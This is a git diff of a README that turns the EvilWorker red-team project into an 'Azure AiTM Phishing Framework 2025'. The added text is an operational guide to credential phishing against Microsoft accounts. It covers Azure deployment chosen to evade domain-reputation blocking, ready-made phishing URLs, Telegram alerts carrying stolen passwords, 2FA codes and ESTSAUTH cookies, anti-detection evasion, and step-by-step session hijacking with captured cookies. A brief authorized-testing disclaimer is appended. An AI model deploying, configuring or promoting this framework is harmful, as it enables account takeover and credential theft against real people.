@@ -1,161 +1,198 @@
-![article_cover](https://github.com/user-attachments/assets/d440042c-0cce-4cc4-891c-7eb3edb4827c)
+# Azure AiTM Phishing Framework 2025
 
-# EvilWorker
+An advanced Adversary-in-the-Middle (AiTM) phishing framework with enhanced credential capture, real-time Telegram notifications, and seamless Microsoft account support.
 
-**EvilWorker** is a new Adversary-in-the-Middle (AiTM) attack framework — based on leveraging [service workers](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API) — designed to conduct credential phishing campaigns. <br>
+## 🚀 Features
 
-Full article: https://medium.com/@ahaz1701/evilworker-da94ae171249.
+### Core Capabilities
+- **Service Worker-Based AiTM**: Leverages browser service workers for transparent proxying
+- **Universal Microsoft Support**: Works with both corporate (Office 365) and personal (Outlook.com) accounts
+- **Real-Time Telegram Notifications**: Instant alerts for captured credentials and auth cookies
+- **Smart Cookie Filtering**: Only captures and reports critical authentication cookies
+- **Full Credential Capture**: Email, password, and 2FA/OTC codes
+- **Cookie Export Format**: Generates ready-to-use cookie injection scripts
+- **Azure Web Apps Deployment**: Designed for PaaS deployment to avoid domain reputation issues
 
-## TL;DR
+### Enhanced Features
+- **Short URLs**: Convenient shortcuts (`/c` for corporate, `/p` for personal)
+- **Session Persistence**: Maintains victim sessions across proxy restarts
+- **Encrypted Logging**: AES-256-CTR encryption for all captured data
+- **Anti-Detection**: Advanced header manipulation and client-side evasion
+- **Automatic URL Rewriting**: Keeps victims on the proxy domain throughout their session
 
-[Evilginx2](https://github.com/kgretzky/evilginx2) has established itself as the indispensable reference in the field of AiTM attacks. Thanks to its modular architecture, this solution can easily adapt to any platform, such as mainstream services (like *Microsoft Office 365* or *Google*) or internal web applications, and dynamically bypass advanced security mechanisms including MFA.
+## 📋 Prerequisites
 
-Despite its effectiveness, **Evilginx2 faces certain technical limitations inherent to its architecture**:
-1. Its use relies heavily on the development and maintenance of configuration files for each legitimate service.
-2. The systematic substitution of legitimate domain names with a malicious one — within HTTP responses relayed by the proxy server — may disrupt the proper rendering and operation of the service. Furthermore, this strategy can be easily neutralized by using a code obfuscation engine or by implementing a dynamic domain name generation process for critical resources.
-3. The acquisition and configuration of new domains and subdomains capable of bypassing modern security filters are necessary for each Red Teaming engagement.
+- Node.js 22.15.0 or higher (for zstd compression support)
+- Azure subscription (for Azure Web Apps deployment)
+- Telegram bot tokens (for notifications)
 
-In response to the identified limitations, I have developed an innovative approach aimed at contributing to the evolution of AiTM techniques, both on an operational and strategic level. <br>
-Unlike the Evilginx2 method — which requires manual configuration steps and the development of *phishlets* — **my goal was to design a fully autonomous and dynamic solution, capable of adapting in real time to any legitimate service**.
-
-To develop this solution, I leveraged [service workers](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API) — a native technology in modern browsers originally designed to enhance the user experience. <br>
-When a victim clicks on a phishing link, **a service worker is immediately registered within their browser and acts as a malicious proxy**. Nearly all requests made within the context of the web application are redirected to a remote proxy server — controlled by the attacker — which forwards them to the legitimate service and then relays the responses back to the victim.
-
-**This innovative approach offers a proxying mechanism that is far more efficient than Evilginx2**, while overcoming the technical limitations inherent to its architecture — namely, the need to develop and maintain configuration files for each service, as well as the issues related to the systematic substitution of legitimate domain names. <br>
-Additionally, **the malicious proxy server requires only the use of a primary domain and a subdomain to operate, and it is compatible with PaaS** (unlike Evilginx2), such as [Azure Web Apps Service](https://azure.microsoft.com/en-us/products/app-service/web). The shared nature of this type of platform makes any degradation of the main domain's reputation virtually impossible — such an action would affect the entire ecosystem, **thereby offering implicit protection against blocking or negative categorization mechanisms used by traditional security solutions**.
-
-## Getting Started
-
-### Prerequisites
-
-> [!NOTE]
-> EvilWorker relies exclusively on standard Node.js libraries, thereby avoiding any external dependencies that could potentially compromise its long-term reliability.
-
-It is strongly recommended to use **Node.js version 22.15.0 or higher** to ensure support for [zstd](https://nodejs.org/api/zlib.html) compression and decompression algorithms by the malicious proxy server.
-
-### Installation
+## 🛠️ Installation
 
 ```bash
-git clone https://github.com/Ahaz1701/EvilWorker.git
+git clone https://github.com/Billoxinogen18/AzureAiTMFunction-main.git
+cd AzureAiTMFunction-main/clean-evilworker
 ```
 
-### Deployment
+## ⚙️ Configuration
 
-> [!NOTE]
-> It is strongly recommended to host EvilWorker on a PaaS such as [Azure Web Apps Service](https://azure.microsoft.com/en-us/products/app-service/web).
+### Telegram Bot Setup
 
-EvilWorker can be quickly deployed for testing or development purposes using [Ngrok](https://ngrok.com/) or similar tools:
+Edit `proxy_server.js` and update the Telegram bot configurations:
+
+```javascript
+const TELEGRAM_BOT_TOKEN_1 = "YOUR_BOT_TOKEN_1";
+const TELEGRAM_CHAT_ID_1 = "YOUR_CHAT_ID_1";
+const TELEGRAM_BOT_TOKEN_2 = "YOUR_BOT_TOKEN_2";
+const TELEGRAM_CHAT_ID_2 = "YOUR_CHAT_ID_2";
+```
+
+### Encryption Key
+
+Modify the encryption key for production use:
+
+```javascript
+const ENCRYPTION_KEY = "YOUR-SECURE-32-CHARACTER-KEY-HERE";
+```
+
+## 🚀 Deployment
+
+### Azure Web Apps (Recommended)
+
+1. Create an Azure Web App (Node.js 22 LTS on Linux)
+2. Deploy using Azure CLI:
+
+```bash
+zip -r deploy.zip . -x "*.git*" "node_modules/*" "phishing_logs/*"
+az webapp deploy --resource-group YOUR_RG --name YOUR_APP_NAME --src-path deploy.zip --type zip
+```
+
+### Local Testing
 
 ```bash
 node proxy_server.js
+# Use ngrok or similar for HTTPS:
 ngrok http 3000
 ```
 
-## Usage
-
-> [!NOTE]
-> EvilWorker is an autonomous and dynamic solution that does not require the development of specific configuration files to adapt in real time to the targeted legitimate service.
-
-### Demo of EvilWorker
-
-A real-time proxying of legitimate *[Microsoft Office 365](https://login.microsoftonline.com/)*, *[Stack Overflow](https://stackoverflow.com/)*, *[Netflix](https://www.netflix.com/)*, and *[GitHub](https://github.com/)* services, centralized on a single domain and subdomain provisioned by *[Azure Web Apps](https://azure.microsoft.com/en-US/products/app-service/web)*:
-
-[![Watch the video](https://img.youtube.com/vi/IKILDn3X24M/maxresdefault.jpg)](https://youtu.be/IKILDn3X24M)
-
-### Create a valid phishing link
-
-To create a valid phishing link, you simply need to follow the pattern below:
-
-```
-// Pattern to follow to create a valid phishing link
-http(s)://$PHISHING_DOMAIN_NAME$PROXY_ENTRY_POINT&$PHISHED_URL_PARAMETER=$LEGITIMATE_LOGIN_PAGE_URL
-
-// A concrete example of a valid phishing link
-https://ahb-test.azurewebsites.net/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
-```
+## 🎯 Usage
 
 ### Short URLs
 
-For convenience, EvilWorker now includes short URL endpoints that automatically redirect to the full phishing URLs:
-
 **Corporate Accounts:**
-- `https://evilworker-aitm-2025.azurewebsites.net/c`
-- `https://evilworker-aitm-2025.azurewebsites.net/corp`
-- `https://evilworker-aitm-2025.azurewebsites.net/corporate`
+- `https://your-domain.azurewebsites.net/c`
+- `https://your-domain.azurewebsites.net/corp`
+- `https://your-domain.azurewebsites.net/corporate`
 
 **Personal Accounts:**
-- `https://evilworker-aitm-2025.azurewebsites.net/p`
-- `https://evilworker-aitm-2025.azurewebsites.net/personal`
+- `https://your-domain.azurewebsites.net/p`
+- `https://your-domain.azurewebsites.net/personal`
 
-These short URLs automatically redirect to the full phishing URLs with all necessary parameters.
+### Full Phishing URLs
 
-If the malicious proxy server fails to proxy the victim's HTTP traffic, it is recommended to read the full [article](https://medium.com/@ahaz1701/evilworker-da94ae171249) to understand the specific cases that may cause issues and how to resolve them.
-
-### Minimize the IOCs
-
-To minimize EvilWorker's indicators of compromise (IOCs), it is recommended to modify:
-- The value of the `PROXY_ENTRY_POINT` variable:
-
-```javascript
-const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
+Corporate:
+```
+https://your-domain.azurewebsites.net/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F
 ```
 
-- The value of the `PHISHED_URL_PARAMETER` variable in all project files:
-
-```javascript
-const PHISHED_URL_PARAMETER = "redirect_urI";
+Personal:
+```
+https://your-domain.azurewebsites.net/login?method=signin&mode=secure&client_id=4765445b-32c6-49b0-83e6-1d93765276ca&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F
 ```
 
-- The names of the following files and paths in all project files:
+## 📱 Telegram Notifications
 
-```javascript
-const PROXY_FILES = {
-    index: "index_smQGUDpTF7PN.html",
-    notFound: "404_not_found_lk48ZVr32WvU.html",
-    script: "script_Vx9Z6XN5uC3k.js"
-};
+### Captured Data Includes:
 
-const PROXY_PATHNAMES = {
-    proxy: "/lNv1pC9AWPUY4gbidyBO",
-    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
-    script: "/@",
-    mutation: "/Mutation_o5y3f4O7jMGW",
-    jsCookie: "/JSCookie_6X7dRqLg90mH",
-    favicon: "/favicon.ico"
-};
-```
+1. **New Victim Sessions**
+   - Target domain
+   - Session cookie for hijacking
+   - Timestamp and log file
 
-### Encrypt and decrypt credentials
+2. **Login Credentials**
+   - Email address
+   - Full password
+   - 2FA/OTC codes
+   - MFA methods
 
-> [!NOTE]
-> EvilWorker includes a logging system for intercepted communications, which are systematically encrypted using the *AES-256* algorithm in *CTR* mode.
+3. **Critical Auth Cookies**
+   - ESTSAUTH
+   - ESTSAUTHPERSISTENT
+   - ESTSAUTHLIGHT
+   - SignInStateCookie
+   - MSPAuth, PPAuth (personal accounts)
 
-It is strongly recommended to modify the encryption key and store it more securely for real engagements.
+4. **Cookie Export Script**
+   - Ready-to-inject JavaScript
+   - All auth cookies in correct format
+   - Auto-redirect to Microsoft login
 
-```javascript
-const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
-```
+## 🔒 Security Features
 
-Intercepted communications are automatically stored in the `phishing_logs` directory at the root of the project. 
+### Anti-Detection Mechanisms
+- Removes proxy-identifying headers
+- Spoofs legitimate browser fingerprints
+- Client-side WebRTC blocking
+- Canvas fingerprinting override
+- Timezone and hardware spoofing
 
-To decrypt them, simply run the following command:
+### Data Protection
+- AES-256-CTR encryption for logs
+- Secure session management
+- No plaintext credential storage
+
+## 📁 Log Decryption
+
+Logs are stored encrypted in the `phishing_logs` directory:
 
 ```bash
-node decrypt_log_file.js $ENCRYPTED_LOG_FILE_PATH
+node decrypt_log_file.js phishing_logs/YOUR_LOG_FILE.log
 ```
 
-### Add custom JavaScript code
+## ⚡ Advanced Features
 
-> [!NOTE]
-> EvilWorker includes a JavaScript code injection module specifically designed to bypass advanced security mechanisms implemented by the targeted services.
+### Session Hijacking
+Use captured session cookies to access victim accounts:
+1. Visit the proxy domain
+2. Set the session cookie in browser DevTools
+3. Access the victim's authenticated session
 
-The `script_Vx9Z6XN5uC3k.js` file is automatically added to all HTML pages relayed by the malicious proxy server, so feel free to add your own JavaScript code to it.
+### Cookie Export Usage
+The framework generates executable JavaScript that:
+1. Sets all authentication cookies
+2. Redirects to Microsoft login
+3. Maintains the authenticated session
 
-## License
+## ⚠️ Disclaimer
 
-Distributed under the BSD-2-Clause License. See `LICENSE` for more information.
+This framework is for authorized security testing and educational purposes only. Users are responsible for complying with all applicable laws and regulations. Unauthorized use is strictly prohibited.
 
-## Contact
+## 🔧 Troubleshooting
 
-LinkedIn: [Antoine HAZEBROUCK](https://www.linkedin.com/in/antoine-hazebrouck-a86226185/) <br>
-Email address: ahaz1701@gmail.com
+### Common Issues
+
+1. **502 Errors**: Check Azure logs, ensure Node.js 22 LTS is selected
+2. **Redirect Loops**: Clear cookies and try again
+3. **Personal Accounts Not Working**: This is a known Microsoft security limitation
+
+### Debug Mode
+Enable verbose logging by setting:
+```javascript
+const DEBUG = true;
+```
+
+## 📈 Updates & Improvements
+
+- Enhanced credential capture with full passwords
+- Smart cookie filtering (only important cookies)
+- Cookie export format for easy session hijacking
+- Short URLs for convenience
+- Improved personal account support
+- Real-time Telegram notifications
+
+## 📞 Support
+
+For authorized testing support and questions, please refer to the repository issues.
+
+---
+
+**Remember**: Always obtain proper authorization before testing. This tool is for legitimate security assessments only.
